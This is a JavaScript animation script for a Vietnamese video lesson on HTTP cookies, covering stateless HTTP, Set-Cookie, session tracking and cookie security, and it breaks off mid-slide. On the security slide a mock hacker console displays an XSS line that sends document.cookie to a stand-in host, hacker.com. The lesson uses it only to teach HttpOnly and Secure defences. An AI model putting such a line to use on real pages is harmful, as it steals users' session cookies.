/**
 * Video 35: Web HTTP Cookies — Premium Simulation Logic
 */
(function () {
    'use strict';

    const keywordsData = {
        slide_cookie_intro: [
            { text: 'HTTP Cookie', start: 8.0, end: 14.5, class: 'active-gold' }
        ],
        slide_cookie_stateless: [
            { text: 'stateless', start: 1.5, end: 6.0, class: 'active-bad' },
            { text: 'Ủa bạn là ai?', start: 9.0, end: 14.0, class: 'active-bad' }
        ],
        slide_cookie_header: [
            { text: 'Set-Cookie', start: 2.0, end: 7.0, class: 'active-good' },
            { text: 'thẻ thành viên', start: 8.0, end: 13.0, class: 'active-gold' }
        ],
        slide_cookie_tracking: [
            { text: 'Cookie:', start: 1.5, end: 6.0, class: 'active-gold' },
            { text: 'session_id', start: 6.0, end: 11.0, class: 'active-good' }
        ],
        slide_cookie_security: [
            { text: 'XSS', start: 2.0, end: 6.0, class: 'active-bad' },
            { text: 'HttpOnly', start: 7.0, end: 11.5, class: 'active-good' },
            { text: 'Secure', start: 11.5, end: 15.5, class: 'active-good' }
        ],
        slide_cookie_outro: [
            { text: 'thẻ nhớ thông minh', start: 1.0, end: 7.0, class: 'active-gold' }
        ]
    };

    const customSlideIds = [
        'slide_cookie_intro', 'slide_cookie_stateless', 'slide_cookie_header',
        'slide_cookie_tracking', 'slide_cookie_security', 'slide_cookie_outro'
    ];

    function initIcons() {
        if (window.lucide) window.lucide.createIcons();
    }

    function sceneWrap(inner, absolute, tint) {
        const bgClass = tint ? ` v35-scene-bg ${tint}` : ' v35-scene-bg';
        const absHtml = absolute || '';
        return `<div class="v35-zoom-container"><div class="${bgClass.trim()}"></div>${absHtml}<div class="v35-scene-content">${inner}</div></div>`;
    }

    function getCenterOffset(el, container) {
        if (!el || !container) return { x: 0, y: 0 };
        const rect = el.getBoundingClientRect();
        const contRect = container.getBoundingClientRect();
        const zoom = container.offsetWidth > 0 ? (contRect.width / container.offsetWidth) : 1.45;
        return {
            x: (rect.left - contRect.left + rect.width / 2) / zoom,
            y: (rect.top - contRect.top + rect.height / 2) / zoom
        };
    }

    function getPathPoint(start, end, t) {
        const dx = end.x - start.x;
        const dy = end.y - start.y;
        if (Math.abs(dy) < 5) return { x: start.x + dx * t, y: start.y + dy * t };
        const mt = 1 - t;
        return {
            x: mt * mt * mt * start.x + 3 * mt * mt * t * (start.x + dx * 0.4)
                + 3 * mt * t * t * (end.x - dx * 0.4) + t * t * t * end.x,
            y: mt * mt * mt * start.y + 3 * mt * mt * t * start.y
                + 3 * mt * t * t * end.y + t * t * t * end.y
        };
    }

    function drawSVGPath(canvas, pathId, startNode, endNode, container, flowClass) {
        const path = canvas.querySelector(pathId);
        if (!path || !startNode || !endNode || !container) return;
        const start = getCenterOffset(startNode, container);
        const end = getCenterOffset(endNode, container);
        const dx = end.x - start.x;
        const dy = end.y - start.y;
        if (Math.abs(dy) < 5) {
            path.setAttribute('d', `M ${start.x} ${start.y} L ${end.x} ${end.y}`);
        } else {
            path.setAttribute('d', `M ${start.x} ${start.y} C ${start.x + dx * 0.4} ${start.y}, ${end.x - dx * 0.4} ${end.y}, ${end.x} ${end.y}`);
        }
        path.setAttribute('stroke-width', '2.5');
        path.setAttribute('fill', 'none');
        path.setAttribute('stroke-dasharray', '5 4');
        path.setAttribute('class', flowClass || 'flowing');
    }

    function placePacket(wrap, start, end, t) {
        if (!wrap) return;
        const pt = getPathPoint(start, end, t);
        wrap.style.left = `${pt.x}px`;
        wrap.style.top = `${pt.y}px`;
        wrap.classList.add('visible');
    }

    function hidePacket(wrap) {
        if (wrap) wrap.classList.remove('visible');
    }

    // HTML Generator Helpers
    function browserMockupHTML(contentHTML, addressUrl, isActiveBlue) {
        const activeClass = isActiveBlue ? ' active-blue' : '';
        return `
        <div class="v35-browser-mock${activeClass}" id="v35-browser-mockup">
            <div class="v35-browser-header">
                <div class="v35-browser-dots">
                    <div class="v35-browser-dot r"></div>
                    <div class="v35-browser-dot y"></div>
                    <div class="v35-browser-dot g"></div>
                </div>
                <div class="v35-browser-address" id="v35-browser-address-url">${addressUrl || 'https://sneakerland.vn/product/123'}</div>
            </div>
            <div class="v35-browser-body">
                ${contentHTML}
            </div>
        </div>`;
    }

    function shopNavHTML(profileName, isAnonymous, cartCount) {
        const activeClass = isAnonymous ? '' : ' active-user';
        const profileText = isAnonymous ? 'Khách Vô Danh' : (profileName || 'Nguyễn Văn A');
        const avatar = isAnonymous ? '👤' : '🙋‍♂️';
        const badgeHtml = cartCount > 0 ? `<div class="v35-shop-cart-badge" id="v35-shop-cart-badge">${cartCount}</div>` : '';
        return `
        <div class="v35-shop-nav">
            <span class="v35-shop-logo">👟 SNEAKERLAND</span>
            <div class="v35-shop-search">🔍 Tìm kiếm giày...</div>
            <div class="v35-shop-right">
                <div class="v35-shop-profile${activeClass}" id="v35-shop-profile">
                    <span class="v35-shop-profile-avatar">${avatar}</span>
                    <span>${profileText}</span>
                </div>
                <button class="v35-shop-cart-btn" id="v35-shop-cart-icon">
                    🛒
                    ${badgeHtml}
                </button>
            </div>
        </div>`;
    }

    function shopProductViewHTML() {
        return `
        <div class="v35-product-detail-view">
            <div class="v35-product-visual">
                <div class="v35-product-stand"></div>
                <div class="v35-product-emoji-big">👟</div>
            </div>
            <div class="v35-product-info">
                <div class="v35-prod-stars">⭐⭐⭐⭐⭐</div>
                <div class="v35-prod-title">Air Max Premium</div>
                <div class="v35-prod-price">1.500.000₫</div>
                <button class="v35-prod-btn" id="v35-product-buy-btn">Thêm vào giỏ</button>
            </div>
        </div>`;
    }

    function devToolsHTML(cookies, showShield) {
        let content = '';
        if (!cookies || cookies.length === 0) {
            content = `<div class="v35-devtools-empty">No cookies stored for this domain</div>`;
        } else {
            let rowsHtml = '';
            cookies.forEach(c => {
                const hBadge = c.httpOnly ? '<span class="v35-cookie-badge yes">HttpOnly</span>' : '<span class="v35-cookie-badge no">None</span>';
                const sBadge = c.secure ? '<span class="v35-cookie-badge yes">Secure</span>' : '<span class="v35-cookie-badge no">None</span>';
                rowsHtml += `
                <tr class="${c.highlight ? 'active-hl' : ''}" id="v35-cookie-row-${c.name}">
                    <td style="color:var(--cookie-gold);font-weight:bold;">${c.name}</td>
                    <td>${c.value}</td>
                    <td>${c.domain}</td>
                    <td>${hBadge}</td>
                    <td>${sBadge}</td>
                </tr>`;
            });
            content = `
            <table class="v35-cookie-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Value</th>
                        <th>Domain</th>
                        <th>HttpOnly</th>
                        <th>Secure</th>
                    </tr>
                </thead>
                <tbody>
                    ${rowsHtml}
                </tbody>
            </table>`;
        }

        const shieldHtml = showShield ? `
        <div class="v35-shield-overlay" id="v35-security-shield">
            <div class="v35-shield-text">HttpOnly Protection Active</div>
        </div>` : '';

        return `
        <div class="v35-devtools" id="v35-devtools-panel">
            <div class="v35-devtools-header">
                <div class="v35-devtools-tab">Elements</div>
                <div class="v35-devtools-tab">Console</div>
                <div class="v35-devtools-tab active" id="v35-devtools-tab-cookie">Application (Cookies)</div>
                <div class="v35-devtools-tab">Network</div>
            </div>
            <div class="v35-devtools-body">
                ${shieldHtml}
                <div class="v35-devtools-path">Storage > Cookies > https://sneakerland.vn</div>
                ${content}
            </div>
        </div>`;
    }

    function serverMockHTML(idPrefix, title, statusLabel, activeLed, codeText, isError) {
        const ledClass = isError ? 'active error' : (activeLed ? 'active' : '');
        const activeColorClass = isError ? 'glow-red' : (activeLed ? 'active-green' : '');
        return `
        <div class="v35-server-mock ${activeColorClass}" id="${idPrefix}-server">
            <div class="v35-server-header">
                <div class="v35-server-title-bar">
                    <i data-lucide="server" style="width:11px;height:11px;color:var(--cookie-green);"></i>
                    <span>${title || 'Web Server'}</span>
                </div>
                <div class="v35-server-leds">
                    <div class="v35-server-led ${ledClass}"></div>
                    <div class="v35-server-led"></div>
                </div>
            </div>
            <div class="v35-server-terminal">
                <span class="v35-term-title">Web Logs: ${statusLabel || 'Idle'}</span>
                <div class="v35-term-log" id="${idPrefix}-term-log">${codeText || 'Waiting for HTTP requests...'}</div>
            </div>
        </div>`;
    }

    function databasePanelHTML(idPrefix, title, activeRowIndex, scanActive) {
        const rows = [
            { id: 'xyz', user: 'Nguyễn Văn A' },
            { id: 'abc', user: 'Trần Văn B' }
        ];
        let rowsHtml = '';
        rows.forEach((r, idx) => {
            const isHl = idx === activeRowIndex ? ' active-hl' : '';
            rowsHtml += `
            <div class="v35-db-row-item${isHl}">
                <span>ID: ${r.id}</span>
                <span>User: ${r.user}</span>
            </div>`;
        });

        const scanClass = scanActive ? ' scanning' : '';

        return `
        <div class="v35-db-panel" id="${idPrefix}-db-panel">
            <div class="v35-db-header">
                <i data-lucide="database" style="width:11px;height:11px;color:var(--cookie-blue);"></i>
                <span>${title || 'Session DB'}</span>
            </div>
            <div class="v35-db-body-layout">
                <div class="v35-db-cylinder" id="${idPrefix}-db-cylinder">
                    <div class="v35-db-cylinder-ring"></div>
                    <div class="v35-db-cylinder-ring"></div>
                </div>
                <div class="v35-db-rows" style="position:relative;">
                    <div class="v35-db-scanline${scanClass}" id="${idPrefix}-db-scan"></div>
                    ${rowsHtml}
                </div>
            </div>
        </div>`;
    }

    function hackerConsoleHTML(codeLineText, logText, isSuccess) {
        const logClass = isSuccess ? 'v35-hacker-log success' : 'v35-hacker-log';
        return `
        <div class="v35-hacker-card" id="v35-security-hacker-card">
            <div class="v35-hacker-header">
                <i data-lucide="terminal" style="width:11px;height:11px;color:var(--cookie-red);"></i>
                <span class="v35-hacker-title">Malicious XSS</span>
            </div>
            <div class="v35-hacker-body">
                <code class="v35-hacker-code">${codeLineText || 'fetch(\'http://hacker.com/..\')'}</code>
                <div class="${logClass}" id="v35-security-hacker-log">${logText || 'Listening for stolen data...'}</div>
            </div>
        </div>`;
    }

    // Main render & update plugin hook
    function renderGfx(slideId, canvas, isPlaying, getSlideDuration, slide) {
        const needsTemplate = canvas.getAttribute('data-sim-template') !== slideId || canvas.innerHTML === '';
        if (needsTemplate) {
            canvas.setAttribute('data-sim-template', slideId);
            canvas.setAttribute('data-paths-drawn', 'false');
        }
        if (!needsTemplate) return;

        if (slideId === 'slide_cookie_intro') {
            canvas.innerHTML = sceneWrap(`
                <div class="v35-cookie-intro-container">
                    <div class="v35-cookie-glow-ring"></div>
                    <div class="v35-cookie-glow-ring inner"></div>
                    <div class="v35-giant-cookie">🍪</div>
                </div>
                <div class="v35-glass-card glow-gold" style="text-align: center; max-width: 480px; padding: 18px 24px;">
                    <div class="v35-status-badge gold" style="margin-bottom: 10px; font-size: 13px; padding: 4px 10px;">
                        <i data-lucide="cookie" style="width:16px;height:16px;margin-right:2px;"></i> HTTP Cookie
                    </div>
                    <div style="font-family:'Fira Code', monospace; font-size: 15px; font-weight: bold; color: var(--cookie-gold); line-height: 1.45;" id="v35-intro-label">
                        Khởi tạo phiên làm việc thông minh
                    </div>
                </div>`, null, 'gold-tint');
            initIcons();
        }
        else if (slideId === 'slide_cookie_stateless') {
            const browserBody = `
                ${shopNavHTML('Khách Vô Danh', true, 0)}
                ${shopProductViewHTML()}
                ${devToolsHTML([], false)}
            `;

            const inner = `
                <div class="v35-vertical-stack">
                    ${browserMockupHTML(browserBody, 'https://sneakerland.vn/product/air-max', true)}
                    <div class="v35-bottom-nodes">
                        ${serverMockHTML('v35-stateless', 'Web Server (Stateless)', 'Idle', false, 'Waiting for requests...', false)}
                        ${databasePanelHTML('v35-stateless', 'Session DB', -1, false)}
                    </div>
                </div>
                <div class="v35-glass-card glow-red" style="margin-top: 4px;">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span class="v35-status-badge red"><i data-lucide="alert-triangle" style="width:12px;height:12px;"></i> HTTP Stateless</span>
                        <span style="font-family:'Fira Code', monospace; font-size: 11px; font-weight: bold; color: var(--cookie-red);" id="v35-stateless-status">Khởi động...</span>
                    </div>
                </div>`;

            const absolute = `
                <svg class="v35-svg-container">
                    <path id="v35-path-stateless-req" class="flow-blue" />
                    <path id="v35-path-stateless-res" class="flow-green" />
                </svg>
                <div class="v35-packet-wrap" id="v35-stateless-pkt"><div class="v35-packet-core emoji shoe">👟</div><span class="v35-packet-label" id="v35-stateless-pkt-lbl">Add Item</span></div>`;

            canvas.innerHTML = sceneWrap(inner, absolute);
            initIcons();
        }
        else if (slideId === 'slide_cookie_header') {
            const browserBody = `
                ${shopNavHTML('Khách Vô Danh', true, 0)}
                ${shopProductViewHTML()}
                ${devToolsHTML([], false)}
            `;

            const inner = `
                <div class="v35-vertical-stack">
                    ${browserMockupHTML(browserBody, 'https://sneakerland.vn/cart', true)}
                    <div class="v35-bottom-nodes">
                        ${serverMockHTML('v35-header', 'Web Server', 'Active', true, 'Generating Response...', false)}
                        ${databasePanelHTML('v35-header', 'Session DB', 0, false)}
                    </div>
                </div>
                <div class="v35-glass-card glow-gold" style="margin-top: 4px;">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span class="v35-status-badge gold"><i data-lucide="save" style="width:12px;height:12px;"></i> Header Response</span>
                        <span style="font-family:'Fira Code', monospace; font-size: 11px; font-weight: bold; color: var(--cookie-gold);" id="v35-header-status">Đang phản hồi...</span>
                    </div>
                </div>`;

            const absolute = `
                <svg class="v35-svg-container">
                    <path id="v35-path-header-res" class="flow-gold" />
                </svg>
                <div class="v35-packet-wrap" id="v35-header-pkt"><div class="v35-packet-core emoji cookie">🍪</div><span class="v35-packet-label">Set-Cookie: session_id=xyz</span></div>`;

            canvas.innerHTML = sceneWrap(inner, absolute);
            initIcons();
        }
        else if (slideId === 'slide_cookie_tracking') {
            const browserBody = `
                ${shopNavHTML('Khách Vô Danh', true, 0)}
                ${shopProductViewHTML()}
                ${devToolsHTML([{ name: 'session_id', value: 'xyz', domain: 'sneakerland.vn', httpOnly: false, secure: false, highlight: false }], false)}
            `;

            const inner = `
                <div class="v35-vertical-stack">
                    ${browserMockupHTML(browserBody, 'https://sneakerland.vn/home', true)}
                    <div class="v35-bottom-nodes">
                        ${serverMockHTML('v35-tracking', 'Web Server', 'Idle', false, 'Waiting...', false)}
                        ${databasePanelHTML('v35-tracking', 'Session DB', -1, false)}
                    </div>
                </div>
                <div class="v35-glass-card glow-green" style="margin-top: 4px;">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span class="v35-status-badge green"><i data-lucide="check-circle" style="width:12px;height:12px;"></i> Profile Restored</span>
                        <span style="font-family:'Fira Code', monospace; font-size: 11px; font-weight: bold; color: var(--cookie-green);" id="v35-tracking-status">Tự động nhận diện...</span>
                    </div>
                </div>`;

            const absolute = `
                <svg class="v35-svg-container">
                    <path id="v35-path-tracking-req" class="flow-gold" />
                    <path id="v35-path-tracking-res" class="flow-green" />
                </svg>
                <div class="v35-packet-wrap" id="v35-tracking-pkt"><div class="v35-packet-core emoji cookie">🍪</div><span class="v35-packet-label">Cookie: session_id=xyz</span></div>`;

            canvas.innerHTML = sceneWrap(inner, absolute);
            initIcons();
        }
        else if (slideId === 'slide_cookie_security') {
            const browserBody = `
                ${shopNavHTML('Nguyễn Văn A', false, 1)}
                ${shopProductViewHTML()}
                ${devToolsHTML([{ name: 'session_id', value: 'xyz', domain: 'sneakerland.vn', httpOnly: false, secure: false, highlight: false }], false)}
            `;

            const inner = `
                <div class="v35-vertical-stack">
                    ${browserMockupHTML(browserBody, 'https://sneakerland.vn/checkout', true)}
                    <div class="v35-bottom-nodes">
                        ${serverMockHTML('v35-security', 'Web Server', 'Active', true, 'HTTPS Active', false)}
                        ${hackerConsoleHTML('fetch(\'http://hacker.com/steal?c=\' + document.cookie)', 'Listening for stolen data...', false)}
                    </div>
                </div>
                <div class="v35-glass-card glow-red" id="v35-security-card" style="margin-top: 4px;">
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span class="v35-status-badge red" id="v35-security-badge"><i data-lucide="shield-alert" style="width:12px;height:12px;"></i> Hijack Alert</span>
                        <span style="font-family:'Fira Code', monospace; font-size: 11px; font-weight: bold; color: var(--cookie-red);" id="v35-security-status">XSS Cookie Theft...</span>
                    </div>
                </div>`;

            const absolute = `
                <svg class="v35-svg-container">
                    <path id="v35-path-security-normal" class="flow-gold" />
                    <path id="v35-path-security-hack" class="flow-red" />
                </svg>
                <div class="v35-packet-wrap" id="v35-security-pkt"><div class="v35-packet-core emoji cookie">🍪</div><span class="v35-packet-label" id="v35-security-pkt-lbl">Cookie: session_id=xyz</span></div>
                <div class="v35-packet-wrap" id="v35-security-hack-pkt"><div class="v35-packet-core emoji stolen">🍪</div><span class="v35-packet-label" id="v35-security-hack-pkt-lbl">document.cookie</span></div>`;

            canvas.innerHTML = sceneWrap(inner, absolute, 'red-tint');
            initIcons();
        }
        else if (slideId === 'slide_cookie_outro') {
            canvas.innerHTML = sceneWrap(`
                <div class="v35-recap-grid">
                    <div class="v35-recap-card" id="v35-recap-1">
                        <div class="v35-recap-icon-wrap" style="background:rgba(59,130,246,0.12);"><i data-lucide="unlink" style="width:16px;height:16px;color:var(--cookie-blue);"></i></div>
                        <span class="v35-recap-title">Stateless Web</span>
                        <span class="v35-recap-desc">HTTP mặc định không ghi nhớ trạng thái giữa các request.</span>
                    </div>
                    <div class="v35-recap-card" id="v35-recap-2">
                        <div class="v35-recap-icon-wrap" style="background:rgba(245,158,11,0.12);"><i data-lucide="cookie" style="width:16px;height:16px;color:var(--cookie-gold);"></i></div>
                        <span class="v35-recap-title">Set-Cookie Tag</span>
                        <span class="v35-recap-desc">Server phát thẻ định danh và trình duyệt lưu trữ an toàn.</span>
                    </div>
                    <div class="v35-recap-card" id="v35-recap-3">
                        <div class="v35-recap-icon-wrap" style="background:rgba(16,185,129,0.12);"><i data-lucide="arrow-left-right" style="width:16px;height:16px;color:var(--cookie-green);"></i></div>
                        <span class="v35-recap-title">Auto Tracking</span>
                        <span class="v35-recap-desc">Trình duyệt tự động đính kèm cookie ở mọi yêu cầu sau đó.</span>
                    </div>
                    <div class="v35-recap-card" id="v35-recap-4">
                        <div class="v35-recap-icon-wrap" style="background:rgba(239,68,68,0.12);"><i data-lucide="shield" style="width:16px;height:16px;color:var(--cookie-red);"></i></div>
                        <span class="v35-recap-title">Security Shields</span>
                        <span class="v35-recap-desc">HttpOnly chống XSS, Secure mã hóa kênh truyền bảo vệ cookie.</span>
                    </div>
                </div>
                <div class="v35-glass-card glow-green" style="display:flex; justify-content:space-between; align-items:center; margin-top:14px;">
                    <span class="v35-status-badge green"><i data-lucide="shield-check" style="width:12px;height:12px;"></i> Session Verified</span>
                    <span style="font-family:'Fira Code', monospace; font-size:10px; font-weight:bold; color:var(--cookie-green);">Production Security Standards</span>
                </div>`, null);
            initIcons();
        }
    }

    // Dynamic badge/profile handlers
    function updateCartBadge(canvas, count) {
        const cartBtn = canvas.querySelector('#v35-shop-cart-icon');
        if (!cartBtn) return;
        let badge = cartBtn.querySelector('.v35-shop-cart-badge');
        if (count > 0) {
            if (!badge) {
                cartBtn.innerHTML = `🛒 <div class="v35-shop-cart-badge" id="v35-shop-cart-badge">${count}</div>`;
            } else {
                badge.textContent = count;
            }
        } else {
            if (badge) badge.remove();
        }
    }

    function updateProfileTag(canvas, name, isAnonymous) {
        const profile = canvas.querySelector('#v35-shop-profile');
        if (!profile) return;
        profile.className = `v35-shop-profile${isAnonymous ? '' : ' active-user'}`;
        profile.innerHTML = `
            <span class="v35-shop-profile-avatar">${isAnonymous ? '👤' : '🙋‍♂️'}</span>
            <span>${name}</span>
        `;
    }

    function updateFrame(slideId, canvas, progress) {
        const container = canvas.querySelector('.v35-zoom-container');

        if (slideId === 'slide_cookie_intro') {
            const label = canvas.querySelector('#v35-intro-label');
            if (progress < 0.3) {
                if (label) label.textContent = 'Khởi tạo phiên làm việc thông minh';
            } else if (progress < 0.65) {
                if (label) label.textContent = '🍪 Tấm thẻ định danh duy trì giỏ hàng';
            } else {
                if (label) label.textContent = 'Tìm hiểu bí mật đằng sau trình duyệt web';
            }
        }
        else if (slideId === 'slide_cookie_stateless') {
            const browser = canvas.querySelector('#v35-browser-mockup');
            const server = canvas.querySelector('#v35-stateless-server');
            const pkt = canvas.querySelector('#v35-stateless-pkt');
            const pktLbl = canvas.querySelector('#v35-stateless-pkt-lbl');
            const status = canvas.querySelector('#v35-stateless-status');
            const serverLog = canvas.querySelector('#v35-stateless-term-log');
            const buyBtn = canvas.querySelector('#v35-product-buy-btn');
            const pCore = pkt ? pkt.querySelector('.v35-packet-core') : null;

            const buyBtnElem = canvas.querySelector('#v35-product-buy-btn');
            const cartIconElem = canvas.querySelector('#v35-shop-cart-icon');

            if (canvas.getAttribute('data-paths-drawn') !== 'true') {
                drawSVGPath(canvas, '#v35-path-stateless-req', buyBtnElem || browser, server, container, 'flow-blue');
                drawSVGPath(canvas, '#v35-path-stateless-res', server, cartIconElem || browser, container, 'flow-green');
                canvas.setAttribute('data-paths-drawn', 'true');
            }

            const buyBtnOff = getCenterOffset(buyBtnElem || browser, container);
            const serverOff = getCenterOffset(server, container);
            const cartIconOff = getCenterOffset(cartIconElem || browser, container);

            if (progress < 0.28) {
                // Request 1: Add Sneaker
                const t = progress / 0.28;
                placePacket(pkt, buyBtnOff, serverOff, t);
                if (pCore) {
                    pCore.className = 'v35-packet-core emoji shoe';
                    pCore.innerText = '👟';
                }
                if (pktLbl) pktLbl.textContent = 'POST /cart/add';
                updateCartBadge(canvas, 0);
                if (status) status.textContent = '1. Gửi request thêm giày 👟';
                if (serverLog) {
                    serverLog.innerHTML = 'POST /cart/add HTTP/1.1\nHost: sneakerland.vn\n\n{"item": "Sneaker"}';
                    serverLog.className = 'v35-term-log highlight';
                }
                if (buyBtn) buyBtn.classList.add('active-click');
            } else if (progress < 0.58) {
                // Response 1: 200 OK
                const t = (progress - 0.28) / 0.3;
                placePacket(pkt, serverOff, cartIconOff, t);
                if (pCore) {
                    pCore.className = 'v35-packet-core emoji success';
                    pCore.innerText = '✅';
                }
                if (pktLbl) pktLbl.textContent = 'HTTP/1.1 200 OK';
                updateCartBadge(canvas, 1);
                if (status) status.textContent = '2. Thêm thành công! Giỏ hàng = 1';
                if (serverLog) {
                    serverLog.innerHTML = 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"status": "success"}';
                    serverLog.className = 'v35-term-log success';
                }
                if (buyBtn) buyBtn.classList.remove('active-click');
            } else if (progress < 0.65) {
                // F5 clicked
                hidePacket(pkt);
                if (status) status.textContent = '3. Bạn nhấn F5 Refresh!';
                updateCartBadge(canvas, 1);
                if (browser) browser.style.filter = 'none';
            } else if (progress < 0.72) {
                // Screen Flashes on F5
                if (browser) browser.style.filter = 'brightness(2) saturate(0.5)';
                updateCartBadge(canvas, 0);
            } else {
                // Cart is wiped, server is stateless
                if (browser) {
                    browser.style.filter = 'none';
                    browser.className = 'v35-browser-mock active-red-shake';
                }
                hidePacket(pkt);
                updateCartBadge(canvas, 0);
                if (status) status.textContent = '❌ Server hỏi: Ủa bạn là ai? Mất giỏ!';
                if (serverLog) {
                    serverLog.innerHTML = 'Session: NOT FOUND\nHTTP is stateless\nCart has been reset to 0';
                    serverLog.className = 'v35-term-log';
                }
            }
        }
        else if (slideId === 'slide_cookie_header') {
            const browser = canvas.querySelector('#v35-browser-mockup');
            const server = canvas.querySelector('#v35-header-server');
            const pkt = canvas.querySelector('#v35-header-pkt');
            const status = canvas.querySelector('#v35-header-status');
            const serverLog = canvas.querySelector('#v35-header-term-log');
            const devtoolsBody = canvas.querySelector('#v35-devtools-panel .v35-devtools-body');
            const devtoolsTab = canvas.querySelector('#v35-devtools-tab-cookie');

            if (canvas.getAttribute('data-paths-drawn') !== 'true') {
                drawSVGPath(canvas, '#v35-path-header-res', server, devtoolsTab || browser, container, 'flow-gold');
                canvas.setAttribute('data-paths-drawn', 'true');
            }

            const serverOff = getCenterOffset(server, container);
            const devToolsOff = getCenterOffset(devtoolsTab || browser, container);

            if (progress < 0.35) {
                hidePacket(pkt);
                if (serverLog) {
                    serverLog.innerHTML = 'HTTP/1.1 200 OK\n[Generating Cookie...]';
                    serverLog.className = 'v35-term-log';
                }
                if (devtoolsBody) {
                    devtoolsBody.innerHTML = `
                        <div class="v35-devtools-path">Storage > Cookies > https://sneakerland.vn</div>
                        <div class="v35-devtools-empty">No cookies stored for this domain</div>
                    `;
                }
                if (status) status.textContent = '1. Server sinh ra mã session cho bạn';
            } else if (progress < 0.82) {
                // Response carries Set-Cookie header
                const t = (progress - 0.35) / 0.47;
                placePacket(pkt, serverOff, devToolsOff, t);
                if (serverLog) {
                    serverLog.innerHTML = 'HTTP/1.1 200 OK\nSet-Cookie: session_id=xyz\nContent-Type: text/html';
                    serverLog.className = 'v35-term-log highlight';
                }
                if (status) status.textContent = '2. Trả về header Set-Cookie: session_id=xyz';
            } else {
                // Arrives and stores inside DevTools
                hidePacket(pkt);
                if (devtoolsBody) {
                    devtoolsBody.innerHTML = `
                        <div class="v35-devtools-path">Storage > Cookies > https://sneakerland.vn</div>
                        ${devToolsHTML([{ name: 'session_id', value: 'xyz', domain: 'sneakerland.vn', httpOnly: false, secure: false, highlight: true }], false)}
                    `;
                }
                if (status) status.textContent = '✓ Trình duyệt tự cất Cookie vào Locker';
            }
        }
        else if (slideId === 'slide_cookie_tracking') {
            const browser = canvas.querySelector('#v35-browser-mockup');
            const server = canvas.querySelector('#v35-tracking-server');
            const dbPanel = canvas.querySelector('#v35-tracking-db-panel');
            const dbCylinder = canvas.querySelector('#v35-tracking-db-cylinder');
            const pkt = canvas.querySelector('#v35-tracking-pkt');
            const status = canvas.querySelector('#v35-tracking-status');
            const serverLog = canvas.querySelector('#v35-tracking-term-log');
            const scan = canvas.querySelector('#v35-tracking-scan');
            const devtoolsTab = canvas.querySelector('#v35-devtools-tab-cookie');
            const profileTag = canvas.querySelector('#v35-shop-profile');

            const pCore = pkt ? pkt.querySelector('.v35-packet-core') : null;
            const pktLbl = pkt ? pkt.querySelector('.v35-packet-label') : null;

            if (canvas.getAttribute('data-paths-drawn') !== 'true') {
                drawSVGPath(canvas, '#v35-path-tracking-req', devtoolsTab || browser, server, container, 'flow-gold');
                drawSVGPath(canvas, '#v35-path-tracking-res', server, profileTag || browser, container, 'flow-green');
                canvas.setAttribute('data-paths-drawn', 'true');
            }

            const devToolsOff = getCenterOffset(devtoolsTab || browser, container);
            const serverOff = getCenterOffset(server, container);
            const profileOff = getCenterOffset(profileTag || browser, container);

            if (progress < 0.4) {
                // Request automatically carries Cookie header
                const t = progress / 0.4;
                placePacket(pkt, devToolsOff, serverOff, t);
                if (pCore) {
                    pCore.className = 'v35-packet-core emoji cookie';
                    pCore.innerText = '🍪';
                }
                if (pktLbl) pktLbl.textContent = 'Cookie: session_id=xyz';
                if (status) status.textContent = '1. Gửi request mới kèm Cookie header';
                if (serverLog) {
                    serverLog.innerHTML = 'GET /home HTTP/1.1\nCookie: session_id=xyz';
                    serverLog.className = 'v35-term-log highlight';
                }
                if (scan) scan.classList.add('scanning');
                if (dbPanel) {
                    dbPanel.innerHTML = databasePanelHTML('v35-tracking', 'Session DB (Scanning)', -1, true);
                }
                updateCartBadge(canvas, 0);
                updateProfileTag(canvas, 'Khách Vô Danh', true);
            } else if (progress < 0.75) {
                // Server matches with DB
                hidePacket(pkt);
                if (status) status.textContent = '2. Server khớp session với Database';
                if (serverLog) {
                    serverLog.innerHTML = 'Matching session...\nDatabase lookup for xyz -> Found User: Nguyễn Văn A';
                    serverLog.className = 'v35-term-log success';
                }
                if (scan) scan.classList.remove('scanning');
                if (dbPanel) {
                    dbPanel.innerHTML = databasePanelHTML('v35-tracking', 'Session DB (Matched)', 0, false);
                }
            } else {
                // Respond and restore user session & cart
                const t = (progress - 0.75) / 0.25;
                placePacket(pkt, serverOff, profileOff, t);
                if (pCore) {
                    pCore.className = 'v35-packet-core emoji shoe';
                    pCore.innerText = '👟';
                }
                if (pktLbl) pktLbl.textContent = 'User: Nguyễn Văn A | Cart: 1';
                updateCartBadge(canvas, 1);
                updateProfileTag(canvas, 'Nguyễn Văn A (VIP)', false);
                if (status) status.textContent = '✓ Nguyễn Văn A VIP restored - không cần login!';
                if (serverLog) {
                    serverLog.innerHTML = 'HTTP/1.1 200 OK\nUser: Nguyễn Văn A (VIP)\nCart: Restored (1 Sneaker)';
                    serverLog.className = 'v35-term-log success';
                }
            }
        }
        else if (slideId === 'slide_cookie_security') {
            const browser = canvas.querySelector('#v35-browser-mockup');
            const server = canvas.querySelector('#v35-security-server');
            const hackerCard = canvas.querySelector('#v35-security-hacker-card');
            const pktNormal = canvas.querySelector('#v35-security-pkt');
            const pktHack = canvas.querySelector('#v35-security-hack-pkt');
            const status = canvas.querySelector('#v35-security-status');
            const badge = canvas.querySelector('#v35-security-badge');
            const card = canvas.querySelector('#v35-security-card');
            const devtoolsTab = canvas.querySelector('#v35-devtools-tab-cookie');
            const devtoolsBody = canvas.querySelector('#v35-devtools-panel .v35-devtools-body');
            const serverLog = canvas.querySelector('#v35-security-term-log');

            const pCoreNormal = pktNormal ? pktNormal.querySelector('.v35-packet-core') : null;
            const pktNormalLbl = pktNormal ? pktNormal.querySelector('.v35-packet-label') : null;
            const pCoreHack = pktHack ? pktHack.querySelector('.v35-packet-core') : null;
            const pktHackLbl = pktHack ? pktHack.querySelector('.v35-packet-label') : null;

            if (canvas.getAttribute('data-paths-drawn') !== 'true') {
                drawSVGPath(canvas, '#v35-path-security-normal', devtoolsTab || browser, server, container, 'flow-gold');
                drawSVGPath(canvas, '#v35-path-security-hack', devtoolsTab || browser, hackerCard, container, 'flow-red');
                canvas.setAttribute('data-paths-drawn', 'true');
            }

            const devToolsOff = getCenterOffset(devtoolsTab || browser, container);
            const serverOff = getCenterOffset(server, container);
            const hackerOff = getCenterOffset(hackerCard, container);

            if (progress < 0.38) {
                // Normal cookie transmission
